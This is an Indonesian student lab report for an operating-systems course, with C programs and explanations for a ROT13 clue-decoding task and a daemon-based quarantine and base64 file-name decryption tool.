# PRAKTIKUM SISOP-2-2025-MH-IT04

KELOMPOK IT04
| No | Nama                              | NRP         |
|----|-----------------------------------|-------------|
| 1  | Raya Ahmad Syarif                 | 5027241041  |
| 2  | Salsa Bil Ulla         | 5027241052 |
| 3  | Adinda Cahya Pramesti   | 5027241117  |

# Pengantar

Laporan resmi ini dibuat untuk praktikum modul 2 yang dilaksanakan pada tanggal 7 Maret 2025 sampai dengan 11 Maret 2025. Praktikum Modul 2 ini terdiri dari empat soal dan dikerjakan oleh tiga orang anggota dengan pembagian tertentu.

Berikut ini pembagian pengerjaan dari kelompok IT04:

    Soal 1 dikerjakan oleh Raya Ahmad Syarif
    Soal 2 dikerjakan oleh Salsa Bil Ulla
    Soal 3 dikerjakan oleh Adinda Cahya Pramesti
    Soal 4 dibagi menjadi 3 bagian:
    - 4a & 4b dikerjakan oleh Adinda Cahya Pramesti
    - 4c & 4d dikerjakan oleh Raya Ahmad Syarif
    - 4e & 4f dikerjakan oleh Salsa Bil Ulla

Sehingga dengan demikian, Pembagian bobot pengerjaan soal menjadi (Raya 33.3%, Salsa 33.3%, Dinda 33.3%).

Kelompok IT04 juga telah menyelesaikan tugas praktikum modul 2 yang telah diberikan. Dari hasil praktikum yang telah dilakukan sebelumnya, maka diperoleh hasil sebagaimana yang dituliskan pada setiap bab di bawah ini.
# Ketentuan
Berikut ini struktur dari repositori praktikum modul 2:

```
—soal_1:
  	— action.c
—soal_2:
  	— starterkit.c
—soal_3:
  	— malware.c
—soal_4:
  	— debugmon.c

```
## Soal 1
Kamu terbangun secara tiba-tiba di suatu lokasi yang tidak diketahui, saat kamu melihat sekitar yang terlihat hanyalah kegelapan dan sebuah pintu dengan dua mata berwarna yang melihatmu dari lubang pintu tersebut.

Ia merupakan naga bernama Cyrus yang menjaga pintu tersebut dan kamu harus meng-input password yang benar untuk masuk. Karena tidak mungkin untuk menebak password, Ia memberikanmu sebuah clue Clues.zip. Untungnya, kamu merupakan Directory Lister yang jago sehingga clue ini dapat berubah menjadi sebuah password. [Author: Fico/ purofuro]

> Penyelesaian
```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <ctype.h>
#include <dirent.h>
#include <unistd.h>

void filter() {
        system("mkdir -p Filtered && echo Filtered Directory Created.");
        system("find Clues -type f -regex '.*/[a-zA-Z0-9]\\.txt' -exec sh -c 'mv \"$0\" Filtered/ && echo Moved files: \"$0\"' {} \\;");
        system("find Clues -type f ! -regex '.*/[a-zA-Z0-9]\\.txt' -exec sh -c 'echo Deleted files: \"$1\" && rm \"$1\"' _ {} \\;");
        printf("Filter Completed.");
}

void combine() {
    DIR *dir = opendir("Filtered");
    if(!dir){
        printf("Can't find Filtered directory. Make sure you filter first! \n");
        return;
    }

    struct dirent *entry;
    char *num[10], *alpha[10];
    int num_idx = 0, a_idx = 0;

    //categorize file (num or alphabet)
    while((entry = readdir(dir)) != NULL){
        if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0){
            continue;
        }

        if (isdigit(entry->d_name[0])) {
            num[num_idx++] = strdup(entry->d_name);
        } else if (isalpha(entry->d_name[0])) {
            alpha[a_idx++] = strdup(entry->d_name);
        }
    }
        closedir(dir);

        //sort number
        for (int i = 0; i < num_idx - 1; i++) {
            for (int j = 0; j < num_idx - i - 1; j++) {
                if (atoi(num[j]) > atoi(num[j + 1])) {
                    char *temp = num[j];
                    num[j] = num[j + 1];
                    num[j + 1] = temp;
                }
            }
        }

        //sort alphabet
        for (int i = 0; i < a_idx - 1; i++) {
            for (int j = 0; j < a_idx - i - 1; j++) {
                if (strcmp(alpha[j], alpha[j + 1]) > 0) {
                    char *temp = alpha[j];
                    alpha[j] = alpha[j + 1];
                    alpha[j + 1] = temp;
                }
            }
        }


        FILE *combined = fopen("Combined.txt", "w");
        char path[256], buffer[256];
        int i = 0;
        int j = 0;
        FILE *f;

        while (i < num_idx || j < a_idx) {
            if (i < num_idx) {
                snprintf(path, sizeof(path), "Filtered/%s", num[i]);
                f = fopen(path, "r");
                if (f) {
                    while (fgets(buffer, sizeof(buffer), f))
                        fputs(buffer, combined);
                    fclose(f);
                    remove(path);
                    printf("Copied: %s\n", num[i]);
                }
                free(num[i]);
                i++;
            }

            if (j < a_idx) {
                snprintf(path, sizeof(path), "Filtered/%s", alpha[j]);
                f = fopen(path, "r");
                if (f) {
                    while (fgets(buffer, sizeof(buffer), f))
                        fputs(buffer, combined);
                    fclose(f);
                    remove(path);
                    printf("Copied: %s\n", alpha[j]);
                }
                free(alpha[j]);
                j++;
            }
        }
    fclose(combined);
    printf("Combine success. \n");
}

char rot13decoder(char c){
    if('A' <= c && c <= 'Z'){
        return ((c - 'A' + 13) % 26) + 'A';
    }
    else if ('a' <= c && c <= 'z'){
        return ((c - 'a' + 13) % 26) + 'a';
    }
    else{
        return c;
    }
}

void decode(){
    FILE *code = fopen("Combined.txt", "r");
    int c;
    FILE *decode = fopen("Decoded.txt", "w");
    while((c = fgetc(code)) != EOF) {
        fputc(rot13decoder(c), decode);
    }
    fclose(code);
    fclose(decode);
    printf("Decode success!");
}


int clue_folder(const char *foldername){
    struct stat st;
    return stat(foldername, &st) == 0 && S_ISDIR(st.st_mode);
}

int main(int argc, char *argv[]) {
    char wget[200];
    char unzip[100];
    char rmv[20];

    if(argc == 3){
        if(strcmp(argv[1], "-m") == 0){
            if(strcmp(argv[2], "Filter") == 0){
                filter();
            }else if(strcmp(argv[2], "Combine") == 0){
                combine();
                }
            else if(strcmp(argv[2], "Decode") == 0){
                decode();
            }
        else{
                printf("please input the right mode \n");
            }
        }
    }
    else{
        if(!clue_folder("Clues")){
            strcpy(wget, "wget --no-check-certificate 'https://docs.google.com/uc?export=download&id=1xFn1OBJUuSdnApDseEczKhtNzyGekauK' -O clue.zip");
            strcpy(unzip, "unzip clue.zip");
            strcpy(rmv, "rm clue.zip");

            system(wget);
            system(unzip);
            system(rmv);
    } else {
            printf("Clues folder has been extracted. \n");
        }
    }
    return 0;
}

```
### > Penjelasan:
1. Header Inclusion
```
 #include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <ctype.h>
#include <dirent.h>
#include <unistd.h>
```
Header inclusion mengimpor library yang diperlukan untuk operasi I/O, manipulasi string, dan lain-lain.

2. Function clue_folder
```
int clue_folder(const char *foldername){
    struct stat st;
    return stat(foldername, &st) == 0 && S_ISDIR(st.st_mode);
}
```
Function ini digunakan untuk mengecek keberadaan folder "Clues" dalam direktori. Jika ada akan mengembalikan nilai 0 sehingga apabila folder sudah ada maka tidak akan mendownload "clues.zip".  

3. Function filter
```
void filter() {
        system("mkdir -p Filtered && echo Filtered Directory Created.");
        system("find Clues -type f -regex '.*/[a-zA-Z0-9]\\.txt' -exec sh -c 'mv \"$0\" Filtered/ && echo Moved files: \"$0\"' {} \\;");
        system("find Clues -type f ! -regex '.*/[a-zA-Z0-9]\\.txt' -exec sh -c 'echo Deleted files: \"$1\" && rm \"$1\"' _ {} \\;");
        printf("Filter Completed.");
}
```
Fungsi ini digunakan untuk filtering hasil ekstraksi fille "clues.zip" dengan kriteria satu digit huruf dan angka.<br>
**[REVISI]**<br>
Mengganti penggunaan function system() yang tidak diperbolehkan.
```
void filter() {
        DIR *dir = opendir("Clues");
        struct dirent *entry;
        if(!dir) { 
            perror("Failed to open, make sure u have extracted the zip file \n");
            return;
        }
        mkdir("Filtered", 0755); 
        printf("Filtered Directory Created.\n");
        while ((entry = readdir(dir)) != NULL) {
            if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0)
                continue;

            char subfolder[256];
            snprintf(subfolder, sizeof(subfolder), "Clues/%s", entry->d_name);
    
            struct stat st;
            if (stat(subfolder, &st) == -1 || !S_ISDIR(st.st_mode))
                continue;
    
            DIR *subdir = opendir(subfolder);
            if (!subdir) continue;
    
            struct dirent *subentry;
            while ((subentry = readdir(subdir)) != NULL) {
                if (strcmp(subentry->d_name, ".") == 0 || strcmp(subentry->d_name, "..") == 0)
                    continue;
    
                char filepath[256];
                snprintf(filepath, sizeof(filepath), "%s/%s", subfolder, subentry->d_name);
    
                struct stat file_st;
                if (stat(filepath, &file_st) == -1)
                    continue;
    
                if (S_ISREG(file_st.st_mode)) {
                    int len = strlen(subentry->d_name);
    
                    if (len == 5 && subentry->d_name[1] == '.' &&
                        subentry->d_name[2] == 't' &&
                        subentry->d_name[3] == 'x' &&
                        subentry->d_name[4] == 't' &&
                        isalnum(subentry->d_name[0])) {

                        char destpath[256];
                        snprintf(destpath, sizeof(destpath), "Filtered/%s", subentry->d_name);
                        if (rename(filepath, destpath) == 0)
                            printf("Moved file: %s\n", subentry->d_name);
                        else
                            perror("Failed to move file");
                    } else {
                        if (remove(filepath) == 0)
                            printf("Deleted file: %s\n", subentry->d_name);
                        else
                            perror("Failed to delete file");
                    }
                }
            }
        }
        printf("Filter Completed.");
}
```
Filter di sini untuk membuat folder "Filtered" yang akan digunakan untuk menyimpan file .txt hasil filter. Function ini juga digunakan untuk mem-filter file.txt sesuai dengan kriterianya yaitu filenamenya hanya mengandung satu huruf dan satu angka lalu menghapus file yang tidak memenuhi kriteria.
4. Function combine
```
void combine() {
    DIR *dir = opendir("Filtered");
    if(!dir){
        printf("Can't find Filtered directory. Make sure you filter first! \n");
        return;
    }

    struct dirent *entry;
    char *num[10], *alpha[10];
    int num_idx = 0, a_idx = 0;

    //categorize file (num or alphabet)
    while((entry = readdir(dir)) != NULL){
        if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0){
            continue;
        }

        if (isdigit(entry->d_name[0])) {
            num[num_idx++] = strdup(entry->d_name);
        } else if (isalpha(entry->d_name[0])) {
            alpha[a_idx++] = strdup(entry->d_name);
        }
    }
        closedir(dir);

        //sort number
        for (int i = 0; i < num_idx - 1; i++) {
            for (int j = 0; j < num_idx - i - 1; j++) {
                if (atoi(num[j]) > atoi(num[j + 1])) {
                    char *temp = num[j];
                    num[j] = num[j + 1];
                    num[j + 1] = temp;
                }
            }
        }

        //sort alphabet
        for (int i = 0; i < a_idx - 1; i++) {
            for (int j = 0; j < a_idx - i - 1; j++) {
                if (strcmp(alpha[j], alpha[j + 1]) > 0) {
                    char *temp = alpha[j];
                    alpha[j] = alpha[j + 1];
                    alpha[j + 1] = temp;
                }
            }
        }


        FILE *combined = fopen("Combined.txt", "w");
        char path[256], buffer[256];
        int i = 0;
        int j = 0;
        FILE *f;

        while (i < num_idx || j < a_idx) {
            if (i < num_idx) {
                snprintf(path, sizeof(path), "Filtered/%s", num[i]);
                f = fopen(path, "r");
                if (f) {
                    while (fgets(buffer, sizeof(buffer), f))
                        fputs(buffer, combined);
                    fclose(f);
                    remove(path);
                    printf("Copied: %s\n", num[i]);
                }
                free(num[i]);
                i++;
            }

            if (j < a_idx) {
                snprintf(path, sizeof(path), "Filtered/%s", alpha[j]);
                f = fopen(path, "r");
                if (f) {
                    while (fgets(buffer, sizeof(buffer), f))
                        fputs(buffer, combined);
                    fclose(f);
                    remove(path);
                    printf("Copied: %s\n", alpha[j]);
                }
                free(alpha[j]);
                j++;
            }
        }
    fclose(combined);
    printf("Combine success. \n");
}
```
Function combine digunakan untuk menggabungkan isi dari file .txt dari hasil filter. Cara kerjanya adalah pertama dengan menyiapkan array num dan char terlebih dahulu untuk menyimpan file yang termasuk huruf dan angka. Terdapat looping dengan function isdigit untuk mengecek filename angka, lalu memasukkannya ke array num. Begitu juga dengan filename huruf. Setelah itu, akan dibuka file "combined.txt" dengan mode write untuk menulis hasilnya. Pertama, akan dilakukan sorting terlebih dahulu agar sesuai dengan urutan. Setelah sesuai, akan dilakukan penggabungan isi secara selang-seling.

4. Function rot13decoder
```
char rot13decoder(char c){
    if('A' <= c && c <= 'Z'){
        return ((c - 'A' + 13) % 26) + 'A';
    }
    else if ('a' <= c && c <= 'z'){
        return ((c - 'a' + 13) % 26) + 'a';
    }
    else{
        return c;
    }
}
```
Function ini untuk mendecode kode rot13 hasil dari combine sebelumnya dan akan digunakan di function decode.

5. Function decode
```
void decode(){
    FILE *code = fopen("Combined.txt", "r");
    int c;
    FILE *decode = fopen("Decoded.txt", "w");
    while((c = fgetc(code)) != EOF) {
        fputc(rot13decoder(c), decode);
    }
    fclose(code);
    fclose(decode);
    printf("Decode success!");
}

```
Hasil dari combine tadi akan dibuka dan membuka file decode.txt tadi dalam mode write yang mana akan menuliskan hasil decode dari combine. Function ini akan mendecode satu persatu char dalam file combine dengan memanfaatkan function rot13decoder, jika sudah akan ditulis ke file "decode.txt" dan akan menutup kedua file yang sudah dibuka.

6. Function main
**[REVISI]** <br>
Mengganti penggunaan function system() yang tidak diperbolehkan.<br>
```

int main(int argc, char *argv[]) {
    if(argc == 3){
        if(strcmp(argv[1], "-m") == 0){
            if(strcmp(argv[2], "Filter") == 0){
                filter();
            }else if(strcmp(argv[2], "Combine") == 0){
                combine();
                }
            else if(strcmp(argv[2], "Decode") == 0){
                decode();
            }
        else{
                printf("please input the right mode \n");
            }
        }
    }
    else{
        if(!clue_folder("Clues")){
            pid_t pid1 = fork();
            if (pid1 == 0) {
                char *wget_args[] = {
                    "wget",
                    "--no-check-certificate",
                    "https://docs.google.com/uc?export=download&id=1xFn1OBJUuSdnApDseEczKhtNzyGekauK",
                    "-O", "clue.zip",
                    NULL
                };
                execvp("wget", wget_args);
                perror("wget failed");
                exit(EXIT_FAILURE);
            }
            waitpid(pid1, NULL, 0);

            pid_t pid2 = fork();
            if (pid2 == 0) {
                char *unzip_args[] = {"unzip", "clue.zip", NULL};
                execvp("unzip", unzip_args);
                perror("unzip failed");
                exit(EXIT_FAILURE);
            }
            waitpid(pid2, NULL, 0);

            pid_t pid3 = fork();
            if (pid3 == 0) {
                char *rm_args[] = {"rm", "clue.zip", NULL};
                execvp("rm", rm_args);
                perror("rm failed");
                exit(EXIT_FAILURE);
            }
            waitpid(pid3, NULL, 0);
    } else {
            printf("Clues folder has been extracted. \n");
        }
    }
    return 0;
}
```
Di function main ini terdapat argc dan argv untuk penerimaan argumen pada saat di-run. Di situ juga ada kondisi apabila folder "Clues" belum ditemukan akan mendownload dan mengekstrak file Clues.zip.

### > Output
![image](https://github.com/user-attachments/assets/26807569-cdb6-4a89-bb9c-5d9dc3a46226)<br>
Pada gambar di atas terdapat output dari Combine yaitu code ROT13, setelah di-decode akan menjadi "BewareOfAmpy".<br>
![image](https://github.com/user-attachments/assets/4b9f0cb0-a209-465e-98f3-236bd1043903)<br>
Apabila "BewareOfAmpy" di-input ke websitenya, akan mengeluarkan output seperti di atas.

## Soal 2
Ada seorang perempuan nolep yang bernama Kanade Yoisaki. Beliau adalah siswi SMA yang mengambil kelas online (tipsen dulu ygy) karena malas sekali untuk keluar rumah. Sebagai gantinya, ia bekerja sebagai seorang composer dan hanya tinggal di dalam rumah saja untuk membuat musik secara terus - menerus. Berkat usahanya, musik ciptaan Kanade pun mulai terkenal dan akhirnya Kanade pun membuat sebuah grup musik bernama 25-ji, Nightcord de., atau yang biasa dikenal dengan N25 atau Niigo.

Pada suatu hari, Kanade ingin membuat sebuah musik baru beserta dengan anggota grup musik lainnya, yaitu Mizuki Akiyama, Mafuyu Asahina, dan Ena Shinonome. Namun sialnya, komputer Kanade terkena sebuah virus yang tidak diketahui. Setelah dianalisis oleh Kanade sendiri, ternyata virus ini bukanlah sebuah trojan, ransomware, maupun tipe virus berbahaya lainnya, melainkan hanya sebuah malware biasa yang hanya bisa membuat sebuah perangkat menjadi lebih lambat dari biasanya. [Author: Haidar / **scar** / **hemorrhager** / 恩赫勒夫]

a. Sebagai teman yang baik, Mafuyu merekomendasikan Kanade untuk **mendownload** dan **unzip** sebuah starter kit berisi file - file acak (sudah termasuk virus) melalui <ins>[link berikut](https://drive.google.com/file/d/1_5GxIGfQr3mNKuavJbte_AoRkEQLXSKS/view)</ins> agar dapat membantu Kanade dalam mengidentifikasi virus - virus yang akan datang. Jangan lupa untuk **menghapus file zip asli** setelah melakukan **unzip**.

b. Setelah mendownload starter kit tersebut, Mafuyu ternyata lupa bahwa pada starter kit tersebut, tidak ada alat untuk **mendecrypt nama** dari file yang diencrypt menggunakan algoritma **Base64**. Oleh karena itu, bantulah Mafuyu untuk **membuat sebuah directory karantina** yang dapat **mendecrypt nama file** yang ada di dalamnya (Hint: gunakan **daemon**).
Penggunaan:
   i. ./starterkit --decrypt

c. Karena Kanade adalah orang yang sangat pemalas (kecuali jika membuat musik), maka tambahkan juga **fitur** untuk **memindahkan file** yang ada pada directory starter kit ke directory karantina, dan begitu juga sebaliknya.
Penggunaan:
   i. ./starterkit --quarantine (pindahkan file dari directory starter kit ke karantina)
   ii. ./starterkit --return (pindahkan file dari directory karantina ke starter kit)

d. Ena memberikan ide kepada mereka untuk menambahkan fitur untuk menghapus file - file yang ada pada directory karantina. Mendengar ide yang bagus tersebut, Kanade pun mencoba untuk menambahkan fitur untuk **menghapus seluruh file** yang ada di dalam **directory karantina**.
Penggunaan:
   i. ./starterkit --eradicate 

e. Karena tagihan listrik Kanade sudah membengkak dan tidak ingin komputernya menyala secara terus - menerus, ia ingin program decrypt nama file miliknya dapat **dimatikan** secara **aman** berdasarkan **PID** dari **proses** program tersebut.
Penggunaan:
   i. ./starterkit --shutdown

f. Mafuyu dan Kanade juga ingin program mereka dapat digunakan dengan aman dan nyaman tanpa membahayakan penggunanya sendiri, mengingat Mizuki yang masih linglung setelah keluar dari labirin Santerra De Laponte. Oleh karena itu, tambahkan **error handling** sederhana untuk mencegah penggunaan yang salah pada program tersebut.

g. Terakhir, untuk **mencatat** setiap penggunaan program ini, Kanade beserta Mafuyu ingin menambahkan **log** dari **setiap penggunaan** program ini dan **menyimpannya** ke dalam file bernama **activity.log**.
Format:
   i. Decrypt: 
[dd-mm-YYYY][HH:MM:SS] - Successfully started decryption process with PID <pid>.

   ii. Quarantine:
[dd-mm-YYYY][HH:MM:SS] - <nama file> - Successfully moved to quarantine directory.

   iii. Return:
[dd-mm-YYYY][HH:MM:SS] - <nama file> - Successfully returned to starter kit directory.

   iv. Eradicate:
[dd-mm-YYYY][HH:MM:SS] - <nama file> - Successfully deleted.

   v. Shutdown:
[dd-mm-YYYY][HH:MM:SS] - Successfully shut off decryption process with PID <pid>.

Contoh struktur akhir directory untuk soal ini adalah sebagai berikut.
**soal_2**
    ├── **activity.log**
    ├── **quarantine**
    ├── **starter_kit**
    │           └── <file hasil unzip>
    ├── **starterkit**
    └── **starterkit.c**

### > Penyelesaian
```
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <dirent.h>
#include <time.h>
#include <signal.h>

#define STARTER_KIT_DIR "starter_kit"
#define QUARANTINE_DIR "quarantine"
#define PID_FILE ".daemon/decrypt.pid"
#define LOG_FILE "activity.log"

int return_mode = 0;

void run_process(char *args[]) {
    pid_t pid = fork();
    if (pid == 0) {
        execvp(args[0], args);
        perror("/ ❦ . . { ERROR } Proses execvp gagal.");
        exit(EXIT_FAILURE);
    } else if (pid > 0) {
        int status;
        waitpid(pid, &status, 0);
    } else {
        perror("/ ❦ . . { ERROR } Proses fork gagal.");
        exit(EXIT_FAILURE);
    }
}

int folder_exists(const char *path) {
    struct stat st;
    return stat(path, &st) == 0 && S_ISDIR(st.st_mode);
}

int is_dir_empty(const char *path) {
    struct dirent *entry;
    DIR *dir = opendir(path);
    if (!dir) return 1;

    while ((entry = readdir(dir)) != NULL) {
        if (strcmp(entry->d_name, ".") != 0 && strcmp(entry->d_name, "..") != 0) {
            closedir(dir);
            return 0;
        }
    }

    closedir(dir);
    return 1;
}

void download_kit() {
    if (return_mode) {
        return;
    }

    char downloaded_flag[512];
    snprintf(downloaded_flag, sizeof(downloaded_flag), ".daemon/.downloaded");

    if (access(".daemon/.downloaded", F_OK) == 0) {
        printf("୨♡୧ ... Starter kit sudah pernah di download. Lewati download ulang.\n");
        return;
    }

    printf("୨♡୧ ... Starter kit belum pernah di download. Mulai download...\n");
    mkdir(".daemon", 0755); 

    char *curl_args[] = {
        "curl", "-v", "-L", "-o", "starter_kit.zip",
        "https://drive.google.com/uc?export=download&id=1_5GxIGfQr3mNKuavJbte_AoRkEQLXSKS",
        NULL
    };    
    run_process(curl_args);

    char *unzip_args[] = {
        "unzip", "starter_kit.zip", "-d", STARTER_KIT_DIR,
        NULL
    };
    run_process(unzip_args);

    char *rm_args[] = {
        "rm", "starter_kit.zip",
        NULL
    };
    run_process(rm_args);

    FILE *flag = fopen(".daemon/.downloaded", "w");
    if (flag) fclose(flag);
}

void log_activity(const char *msg) {
    FILE *fp = fopen(LOG_FILE, "a");
    if (!fp) return;

    time_t now = time(NULL);
    struct tm *t = localtime(&now);
    char buf[100];
    strftime(buf, sizeof(buf), "[%d-%m-%Y][%H:%M:%S]", t);

    fprintf(fp, "%s - %s\n", buf, msg);
    fclose(fp);
}

int is_base64_encoded(const char *str) {
    for (int i = 0; str[i]; i++) {
        if (!((str[i] >= 'A' && str[i] <= 'Z') ||
              (str[i] >= 'a' && str[i] <= 'z') ||
              (str[i] >= '0' && str[i] <= '9') ||
              str[i] == '+' || str[i] == '/' || str[i] == '=')) {
            return 0;
        }
    }
    return 1;
}

char *base64_decode(const char *data) {
    int len = strlen(data);
    char *decoded = malloc(len);
    int val = 0, valb = -8, idx = 0;
    for (int i = 0; i < len; i++) {
        char c = data[i];
        if (c >= 'A' && c <= 'Z') c -= 'A';
        else if (c >= 'a' && c <= 'z') c = c - 'a' + 26;
        else if (c >= '0' && c <= '9') c = c - '0' + 52;
        else if (c == '+') c = 62;
        else if (c == '/') c = 63;
        else continue;
        val = (val << 6) + c;
        valb += 6;
        if (valb >= 0) {
            decoded[idx++] = (char)((val >> valb) & 0xFF);
            valb -= 8;
        }
    }
    decoded[idx] = '\0';
    return decoded;
}

int is_daemon_running() {
    FILE *fp = fopen(PID_FILE, "r");
    if (!fp) return 0;

    pid_t pid;
    if (fscanf(fp, "%d", &pid) != 1) {
        fclose(fp);
        return 0;
    }
    fclose(fp);

    if (kill(pid, 0) == 0) {
        return 1;
    } else {
        return 0;
    }
}

void decrypt_daemon() {
    if (is_daemon_running()) {
        printf("୨♡୧ ... Daemon udah jalan.\n");
        exit(0);
    }    
    pid_t pid = fork();
    if (pid < 0) {
        printf("Dekripsi gagal.");
        exit(EXIT_FAILURE);
    }
    if (pid > 0) {
        printf("୨♡୧ ... Dekripsi  Daemon berhasil dengan PID %d.\n", pid);
        exit(EXIT_SUCCESS);
    }

    setsid();
    chdir(".");
    umask(0);

    if (!folder_exists(".daemon")) {
        mkdir(".daemon", 0755);
    }

    FILE *fp = fopen(PID_FILE, "w");
    if (fp) {
        fprintf(fp, "%d", getpid());
        fclose(fp);
    }

    char msg[100];
    snprintf(msg, sizeof(msg), "Successfully started decryption process with PID %d.", getpid());
    log_activity(msg);

    while (1) {
        DIR *d = opendir(STARTER_KIT_DIR);
        if (!d) {
            sleep(3);
            continue;
        }

        struct dirent *entry;
        while ((entry = readdir(d))) {
            if (entry->d_type == DT_REG) {
                char path[512];
                snprintf(path, sizeof(path), "%s/%s", STARTER_KIT_DIR, entry->d_name);

                if (!is_base64_encoded(entry->d_name)) continue;

                char *decoded_name = base64_decode(entry->d_name);
                char new_path[512];
                snprintf(new_path, sizeof(new_path), "%s/%s", STARTER_KIT_DIR, decoded_name);

                if (access(new_path, F_OK) == 0) {
                    free(decoded_name);
                    continue;
                }
                if (rename(path, new_path) == 0)
                free(decoded_name);
            }
        }
        closedir(d);
        sleep(5);
    }
}

void move_files(const char *src, const char *dst, const char *log_template) {
    if (is_dir_empty(src)) {
        printf("Folder %s kosong. Tidak ada file yang dipindahkan.\n", src);
        return;
    }
    DIR *d = opendir(src);
    if (!d) return;
    struct dirent *entry;
    while ((entry = readdir(d))) {
        if (entry->d_type == DT_REG) {
            char src_path[512], dst_path[512];
            snprintf(src_path, sizeof(src_path), "%s/%s", src, entry->d_name);
            snprintf(dst_path, sizeof(dst_path), "%s/%s", dst, entry->d_name);
            if (rename(src_path, dst_path) == 0) {
                char msg[512];
                snprintf(msg, sizeof(msg), log_template, entry->d_name);
                log_activity(msg);
            }
        }
    }
    closedir(d);
}

void eradicate_quarantine() {
    if (is_dir_empty("quarantine")) {
        printf("/ ❦ . . { ERROR } Tidak ada file di quarantine. Tidak ada yang dihapus.\n");
        return;
    }

    DIR *d = opendir(QUARANTINE_DIR);
    if (!d) return;
    struct dirent *entry;
    while ((entry = readdir(d))) {
        if (entry->d_type == DT_REG) {
            char path[512];
            snprintf(path, sizeof(path), "%s/%s", QUARANTINE_DIR, entry->d_name);
            if (remove(path) == 0) {
                char msg[512];
                snprintf(msg, sizeof(msg), "%s - Successfully deleted.", entry->d_name);
                log_activity(msg);
            }
        }
    }
    closedir(d);
    remove(".daemon/.downloaded");
    printf("୨♡୧ ... Berhasil hapus semua file di quarantine.\n");
}

void shutdown_decrypt_daemon() {
    FILE *fp = fopen(PID_FILE, "r");
    if (!fp) {
        printf("/ ❦ . . { ERROR } Daemon tidak ditemukan. Emang ada dekripsi daemon yang jalan?\n");
        return;
    }

    pid_t pid;
    if (fscanf(fp, "%d", &pid) != 1) {
        printf("/ ❦ . . { ERROR } Gagal membaca PID dari file.\n");
        fclose(fp);
        return;
    }
    fclose(fp);

    if (kill(pid, SIGTERM) == 0) {
        printf("୨♡୧ ... Berhasil membunuh daemon dengan PID %d.\n", pid);
        char msg[128];
        snprintf(msg, sizeof(msg), "Successfully shut off decryption process with PID %d.\n", pid);
        log_activity(msg);
        remove(PID_FILE);
    } else {
        perror("/ ❦ . . { ERROR } Gagal membunuh daemon.");
    }
}

int main(int argc, char *argv[]) {
    mkdir(STARTER_KIT_DIR, 0777);
    mkdir(QUARANTINE_DIR, 0777);

    if (argc < 2) {
        printf("୨♡୧ ... Contoh: ./starterkit --[decrypt|quarantine|return|eradicate|shutdown]\n");
        return 1;
    }

    if (strcmp(argv[1], "--return") == 0) {
        return_mode = 1;
        move_files(QUARANTINE_DIR, STARTER_KIT_DIR, "%s - Successfully returned to starter kit directory.");
        printf("୨♡୧ ... Berhasil balikin semua file ke starter_kit.\n");
    } else if (strcmp(argv[1], "--quarantine") == 0) {
        move_files(STARTER_KIT_DIR, QUARANTINE_DIR, "%s - Successfully moved to quarantine directory.");
        printf("୨♡୧ ... Berhasil mindahin semua file ke quarantine.\n");
    } else if (strcmp(argv[1], "--eradicate") == 0) {
        eradicate_quarantine();
    } else if (strcmp(argv[1], "--decrypt") == 0) {
        download_kit();
        decrypt_daemon();
    } else if (strcmp(argv[1], "--shutdown") == 0) {
        shutdown_decrypt_daemon();
    } else {
        printf("/ ❦ . . { ERROR } Argumen tidak dikenal: %s.\n", argv[1]);
        printf("୨♡୧ ... Contoh: ./starterkit --[decrypt|quarantine|return|eradicate|shutdown].\n");
        return 1;
    }

    return 0;
}
```

### > Penjelasan
#### A. Buat fitur download, unzip, dan hapus zip.
```
void run_process(char *args[]) {
    pid_t pid = fork();
    if (pid == 0) {
        execvp(args[0], args);
        perror("/ ❦ . . { ERROR } Proses execvp gagal.");
        exit(EXIT_FAILURE);
    } else if (pid > 0) {
        int status;
        waitpid(pid, &status, 0);
    } else {
        perror("/ ❦ . . { ERROR } Proses fork gagal.");
        exit(EXIT_FAILURE);
    }
}
```
Fungsi `run_process()` membantu menjalankan **proses eksternal** seperti `curl`, `unzip`, `rm`.

```
void download_kit() {
    if (return_mode) {
        return;
    }

    char downloaded_flag[512];
    snprintf(downloaded_flag, sizeof(downloaded_flag), ".daemon/.downloaded");

    if (access(".daemon/.downloaded", F_OK) == 0) {
        printf("୨♡୧ ... Starter kit sudah pernah di download. Lewati download ulang.\n");
        return;
    }

    printf("୨♡୧ ... Starter kit belum pernah di download. Mulai download...\n");
    mkdir(".daemon", 0755); 

    char *curl_args[] = {
        "curl", "-v", "-L", "-o", "starter_kit.zip",
        "https://drive.google.com/uc?export=download&id=1_5GxIGfQr3mNKuavJbte_AoRkEQLXSKS",
        NULL
    };    
    run_process(curl_args);

    char *unzip_args[] = {
        "unzip", "starter_kit.zip", "-d", STARTER_KIT_DIR,
        NULL
    };
    run_process(unzip_args);

    char *rm_args[] = {
        "rm", "starter_kit.zip",
        NULL
    };
    run_process(rm_args);

    FILE *flag = fopen(".daemon/.downloaded", "w");
    if (flag) fclose(flag);
}
```
Fungsi `download_kit()` adalah fungsi utama di mana zip akan diunduh dari link lalu di unzip dan dihapus file zip-nya.

#### B. Buat fungsi decrypt untuk mengubah nama file dengan encoding base64.
```
int is_base64_encoded(const char *str) {
    for (int i = 0; str[i]; i++) {
        if (!((str[i] >= 'A' && str[i] <= 'Z') ||
              (str[i] >= 'a' && str[i] <= 'z') ||
              (str[i] >= '0' && str[i] <= '9') ||
              str[i] == '+' || str[i] == '/' || str[i] == '=')) {
            return 0;
        }
    }
    return 1;
}
```
Membuat fungsi `int is_base64_encoded()` untuk mengecek apakah kata/kalimat sudah tidak dalam bentuk base64.

```
char *base64_decode(const char *data) {
    int len = strlen(data);
    char *decoded = malloc(len);
    int val = 0, valb = -8, idx = 0;
    for (int i = 0; i < len; i++) {
        char c = data[i];
        if (c >= 'A' && c <= 'Z') c -= 'A';
        else if (c >= 'a' && c <= 'z') c = c - 'a' + 26;
        else if (c >= '0' && c <= '9') c = c - '0' + 52;
        else if (c == '+') c = 62;
        else if (c == '/') c = 63;
        else continue;
        val = (val << 6) + c;
        valb += 6;
        if (valb >= 0) {
            decoded[idx++] = (char)((val >> valb) & 0xFF);
            valb -= 8;
        }
    }
    decoded[idx] = '\0';
    return decoded;
}
```
